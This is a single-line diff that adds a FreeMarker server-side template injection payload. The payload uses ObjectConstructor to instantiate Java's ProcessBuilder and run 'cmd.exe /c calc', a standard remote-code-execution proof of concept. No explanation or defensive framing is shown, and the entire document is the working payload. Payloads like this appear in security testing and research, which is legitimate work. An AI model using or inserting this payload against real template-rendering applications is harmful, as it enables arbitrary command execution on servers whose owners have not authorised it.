@@ -1,0 +1,1 @@
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","cmd.exe","/c","calc").start()}
